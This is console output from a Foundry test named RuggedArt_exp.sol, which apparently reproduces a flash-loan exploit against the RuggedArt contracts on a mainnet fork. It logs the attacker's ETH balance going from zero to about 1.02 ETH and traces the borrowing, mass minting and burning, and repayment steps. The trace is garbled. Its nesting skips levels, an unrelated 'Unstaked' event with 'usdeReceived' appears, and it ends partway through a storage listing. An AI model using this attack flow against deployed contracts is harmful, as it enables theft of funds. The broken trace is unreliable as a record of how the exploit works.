No files changed, compilation skipped

Ran 1 test for test/RuggedArt_exp.sol:ContractTest
[PASS] testExploit() (gas: 7102116)
Logs:
  Attacker Eth balance before attack:: 0
  Attacker Eth balance after attack:: 1023851896415447765

Traces:
  [19491] ContractTest::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 19262233 [1.926e7])
    │   └─ ← [Return] 0
    ├─ [0] VM::label(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], "proxy")
    │   └─ ← [Return]
    ├─ [0] VM::label(RUGGED: [0xbE33F57f41a20b2f00DEc91DcC1169597f36221F], "RUGGED")
    │   └─ ← [Return]
    ├─ [0] VM::label(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], "pool")
    │   └─ ← [Return]
    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
    │   └─ ← [Return]
    ├─ [0] VM::label(RuggedMarket: [0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6], "RuggedMarket")
    │   └─ ← [Return]
    ├─ [0] VM::label(Universal_Router: [0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD], "Universal_Router")
    │   └─ ← [Return]
    └─ ← [Stop]

  [8882910] ContractTest::testExploit()
    ├─ [2534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] 0x0000000000000000000000000000000000000000::fallback()
    │   └─ ← [Stop]
    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   └─ ← [Return]
    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "Attacker Eth balance before attack:", val: 0)
    ├─ [8216165] pool::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19], 0, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [2630] RUGGED::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 356565570739218611936 [3.565e20]
    │   ├─ [2534] WETH::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 21357138155001948655 [2.135e19]
    │   ├─ [2315335] RUGGED::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9159)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9004)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3270)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8866)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 347)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9050)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3033)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 41)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7485)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9192)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1933)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9017)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7093)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4090)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3525)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3978)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4984)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7449)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3913)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 6049)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8796)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4903)
    │   │   ├─ emit ERC20Transfer(from: pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 22000000000000000000 [2.2e19])
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da5: 0 → 41
    │   │   │   │   │   │   @ 0xba2c9d5d63b4586096d418b8bbaeb97a95e473f7b9268d72ef545e57508bfac9: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da6: 0 → 7485
    │   │   │   │   │   │   @ 0xd51f4af17988aa3c9a4279e56b5c513456be996db0aa93724276e1e964f840cd: 0 → 1
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2db3: 0 → 4903
    │   │   │   │   │   │   @ 0x6a9200ad53eee3cd59380e02d8525e3432018f590eac05632ad3da4f4d3ccb4b: 493 → 0
    │   │   │   │   │   │   @ 0xa421f34ee23dbb9537ec1b4f1a9a588ba34e2a5164c64d7eabc1c8445ab8741b: 0 → 23
    │   │   │   │   │   │   @ 0xff97429c16330018304b3cd3ef5adff51d211e1d42cb960fe59b6ce826ca8039: 496 → 0
    │   │   │   │   │   │   @ 0xf853896e04fb6beb93d833844d863061a0341bffbc06e50ef88896dcb9648a2a: 0 → 21
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ce: 9848 → 0
    │   │   │   │   │   │   @ 0x299e4f6b14df7238cfe515bb8f826305c002ee99e13d3a55ed61317e516c4eb4: 1 → 0
    │   │   │   │   │   │   @ 0xb1bdd62affb33a1fdaaa9c1cb3cfe603cc501615bde360965dddaa7fb1630d88: 494 → 0
    │   │   │   │   │   │   @ 0x28cc13b836cf79b3fcf55dfa84c4ced0b94e65e4229aa224d49c90a40eac8b2c: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606de: 358 → 0
    │   │   │   │   │   │   @ 0xf0fec72e7d502a3e794abb758325dc5ec8671d7111943fd8d2c20589e21e8b89: 501 → 0
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d1: 2314 → 0
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d3: 4574 → 0
    │   │   │   │   │   │   @ 0xa20e3973e89279c9c33695d087f1bd3c86901a0f302b3838b1ee47742f565209: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
    │   │   │   │   │   │   @ 0x5064d72a0d09d607b5a0f36fb3fd48fcb48d158f2f29686611d6a7bc85687d87: 1 → 0
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d6: 5717 → 0
    │   │   │   │   │   │   @ 0x5b68167d1efdaa8fed644c82e6506518ecd9bbe54fff55b98737c8ef74194730: 1 → 0
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da8: 0 → 1933
    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4311: 7093 → 5717
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2dad: 0 → 3978
    │   │   │   │   │   │   @ 0xa27a003d522ac157c4e7ffbab56d613e37f5925b9ff9d6fd072e3d4f93ef1f0f: 0 → 34
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2daf: 0 → 7449
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d8: 7637 → 0
    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb471b: 4903 → 643
    │   │   │   │   │   │   @ 0x4d4d0ea6828e6cfadf573d00ca0ceecd1b88d8fe03738c680525933a0c6566d2: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0xff84529e16e49c94f43586df550f0114053b5c9adb3205d522559199b3b6401b: 0 → 1
    │   │   │   │   │   │   @ 0x0c07f4fe9e7a67d59a6d916831877a58b85ff9aa619bc0726a102b66b7e76c9b: 0 → 25
    │   │   │   │   │   │   @ 0xfcfabd4a56e9bfecfa37ff01e38388e0a80a8618e1913ce41ed7253b1cf13dff: 0 → 1
    │   │   │   │   │   │   @ 0x6971aedab59087793b7b619727961bf26ce046f5037bd4ce832c788cc9b6ea48: 0 → 1
    │   │   │   │   │   │   @ 0x933688f4ca8bf55599f7d0385ff5c5c3b6817800c888b0e74578a790cfcfda7b: 1 → 0
    │   │   │   │   │   │   @ 0x6fe927c728cb1a50914fc42111657f0cb05320d84f4bf69c230741967e26adee: 0 → 1
    │   │   │   │   │   │   @ 0x4a86c16f9f4d8ddc461d66e4f2f711659d32a2de536944ecd4866011e4888dfb: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 513 → 493
    │   │   │   │   │   │   @ 0x90f74e7e321e9118b5cac70778fe7663e6d5eb2e2e1379bbdc55c70fa9089b00: 0 → 1
    │   │   │   │   │   │   @ 0xc4c9f34e14fc4bf961f8a2d9b98ab2fe5cd3f23dd1374d1fa763d1c7faa9ff25: 1 → 0
    │   │   │   │   │   │   @ 0x1185aefa921e778827cfc84d680a45c6e7684abdf4dbf0e0c7cf28ca9cd91bc0: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb3f68: 3270 → 9577
    │   │   │   │   │   │   @ 0xa40251d2b6688359486135c6e76e1abd31779178b88ebf380a9f419756243854: 0 → 1
    │   │   │   │   │   │   @ 0x5d4e160575fee9c3345b17a5540abdd97c833048d80099370b0a86e8fdb4ca4b: 0 → 1
    │   │   │   │   │   │   @ 0xbe5073a86d2a3a511f60296c79956c8bd2044f63caaca55ddc877401c827b002: 508 → 0
    │   │   │   │   │   │   @ 0xbcbe385fce068003b1ddb1e0a9686ad1ea890d9a7cfd7b9e73f1cf2cc29aff4f: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da0: 0 → 3270
    │   │   │   │   │   │   @ 0x1caba39457f65f114b07ad8c5d85e0e58a22d995739ecfffc1aa24e764929db2: 0 → 26
    │   │   │   │   │   │   @ 0x871ea06dcb6d3876d4bd46e9dcb1555def501fada80b2cebb6cfa7dba5085a88: 498 → 0
    │   │   │   │   │   │   @ 0x9a86beb6228bf168307f184cf63c593599ffdab1a9a2399ca6e1c21e6fff27ee: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0xf367aeb0eb7f2ba1fba0f21da71493632b960882782022912b6405e708fd562f: 1 → 0
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606df: 643 → 0
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ emit Unstaked(caller: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], usdeReceived: 20000000000000000000 [2e19])
    │   │   │   │   ├─  storage changes:
    │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x000000000000000000000000000000000000000000000001314fb37062980000 → 0x0000000000000000000000000000000000000000000000001bc16d674ec80000
    │   │   │   │   │   @ 5: 0x0000000000000000000000000000000000000000000000001bc16d674ec80000 → 0
    │   │   │   │   │   @ 3: 0x00000000000000000000000000000000000000000000001cf092e13e9a1869d1 → 0x00000000000000000000000000000000000000000000001bdb049b35864869d1
    │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc97: 0x0000000000000000000000000000000000000000000000000ee1d728ef291780 → 0x0000000000000000000000000000000000000000000000000174f810399b2c80
    │   │   │   │   │   @ 4: 0x0000000000000000000000000000000000000000000000000000000b596319c5 → 0x0000000000000000000000000000000000000000000000000000000c38b0d2d1
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Return]
    │   │   ├─ [116880] RUGGED::transfer(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], 22066000000000000000 [2.206e19])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 4903)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 8796)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 6049)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3913)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 7449)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 4984)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3978)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3525)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 4090)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 7093)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9017)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 1933)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9192)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 7485)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 41)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3033)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9050)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 347)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 8866)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3270)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 4945)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 7991)
    │   │   │   ├─ emit ERC20Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], amount: 22066000000000000000 [2.206e19])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xa421f34ee23dbb9537ec1b4f1a9a588ba34e2a5164c64d7eabc1c8445ab8741b: 23 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2db1: 6049 → 0
    │   │   │   │   @ 0x90f74e7e321e9118b5cac70778fe7663e6d5eb2e2e1379bbdc55c70fa9089b00: 1 → 0
    │   │   │   │   @ 0x0fafaf592b21ef4721412e49ab07d865c4e3fb0498759b84225e469cab110d51: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0xfbf57951a20a7af7daeefa1d2d90f0cd061fcf465fe6b720b4ff482e80709475: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9f: 0 → 41
    │   │   │   │   @ 0x8da61f0ba95efa75981093b7e981f31c2521cefb7e27bcc5d8d4ec9d256a89ec: 19 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2db2: 8796 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da6: 7485 → 0
    │   │   │   │   @ 0x6ac42465a8b4c0f32b318bd6a8f0b22cdc01505097dac159adad5ddc02c3cd21: 1 → 0
    │   │   │   │   @ 0xbbdbe4e1aed388a8a210d48bb604ec066f940a7085cd8c3d200a60e0dccf0114: 1 → 0
    │   │   │   │   @ 0x4d4695fd027810f7d8a51d8c6d12aaac78b91258cb3f49850c4ffea388e3b005: 37 → 0
    │   │   │   │   @ 0x6971aedab59087793b7b619727961bf26ce046f5037bd4ce832c788cc9b6ea48: 1 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da5: 41 → 0
    │   │   │   │   @ 0x509055df01107bc64af72dc08330b9397ce32ea3183e634e399c3833b7aa595e: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2db3: 4903 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9b: 0 → 9017
    │   │   │   │   @ 0x754c3d23b53fe0c86c15828a5ac606752c899fa8175b595783936f2a9b59c3df: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x1b137e43b0e30898156d4dbd1f04e48bffecac6b87d788f4d716dc4cedc28e45: 28 → 0
    │   │   │   │   @ 0xdbdc55d7621c6061576ada6656295ae01b65e3eb3f1854f3486f5ce65e3c82d2: 36 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2db0: 3913 → 0
    │   │   │   │   @ 0x92c46ef96d6b5851f28c3b312ac87768a2ba6b97f3e3a5f8cb08c46b35a648b3: 0x0000000000000000000000000000000000000000000000122307adfba2f2fee0 → 0x0000000000000000000000000000000000000000000000135541dc1280b7fee0
    │   │   │   │   @ 0xff842230989f970b5f317b3598e2868dfc6e1bc70472a2e69470aa6da7b9a1f9: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x16d4236f8135b486684a8fac3481a9cf3bb5748669ffb02a03afa726d60d00f8: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e91: 0 → 4903
    │   │   │   │   @ 0xc75099ea203e179b5fed28a847cb830059ddef10f334d856ccf9250c338c1258: 22 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9f: 4945 → 0
    │   │   │   │   @ 0xa27a003d522ac157c4e7ffbab56d613e37f5925b9ff9d6fd072e3d4f93ef1f0f: 34 → 0
    │   │   │   │   @ 0xdc546f96e41e999be4708cb6101a04d8f998356cd939cdf7cc4d0a8fa5af457b: 1 → 0
    │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x0000000000000000000000000000000000000000000000022c415d9bb221d200 → 0x000000000000000000000000000000000000000000000000fa072f84d45cd200
    │   │   │   │   @ 5: 4321 → 4343
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da0: 3270 → 0
    │   │   │   │   @ 0x201eefa0b4934df22afa051a4a9c50a1a60812f397c2287f31526961a63e7648: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9e: 0 → 7485
    │   │   │   │   @ 0x48dd8d21eb66092b5011858cd63de145f4b1a9f5ca695c3ddfa8fa7b24091d97: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e99: 0 → 4090
    │   │   │   │   @ 0x36822dd15940f1efccfbc62c0ff56967efaf9783a99f51ad14a05140cb0a430b: 1 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2daf: 7449 → 0
    │   │   │   │   @ 0x593b9d14d50e92a65df8d78640350d8ddcd444024c2cc502610aac7c5d87a431: 30 → 0
    │   │   │   │   @ 0x8df1577a16d9d36c77559c4b5bc9124bab6715f951b3cec262a08223cd59655a: 1 → 0
    │   │   │   │   @ 0xd688421fed0da63bb41748eaebc09adf1b400e13d1eadd1583aaef2e7b2c03cf: 24 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da3: 9050 → 0
    │   │   │   │   @ 0x28cc13b836cf79b3fcf55dfa84c4ced0b94e65e4229aa224d49c90a40eac8b2c: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9c: 0 → 1933
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2dad: 3978 → 0
    │   │   │   │   @ 0xd51f4af17988aa3c9a4279e56b5c513456be996db0aa93724276e1e964f840cd: 1 → 0
    │   │   │   │   @ 0x278f4573a69e3831cd8adb28e1f945e081534e9d1c9b485ab956be05d3187cd6: 1 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2dae: 4984 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2dac: 3525 → 0
    │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 40 → 18
    │   │   │   │   @ 0x1214a60f33c6391325f4fe835803e25bbbc9ab9ba21d99ebf959d2fd32d9d52e: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0xa9c8473723def7a8ce3ea8bfb784a667951a62cb70ea5379a81bc26ea5519df6: 20 → 0
    │   │   │   │   @ 0xdf386c9f5c4a91c50236b85e63d17a35fdb7e8f95a69d64676cdd3a1b078b98e: 1 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e95: 0 → 7449
    │   │   │   │   @ 0x1caba39457f65f114b07ad8c5d85e0e58a22d995739ecfffc1aa24e764929db2: 26 → 0
    │   │   │   │   @ 0xd9379a4d2df17ecad725133e46dbfa3a48f8df77dd941acd4d8666c461a1777d: 1 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9a: 0 → 7093
    │   │   │   │   @ 0x36bb8b7d694abd1ddcfd6ad0e40c7f1bb98463dfcb3f63c4d8ea061ef08403b2: 29 → 0
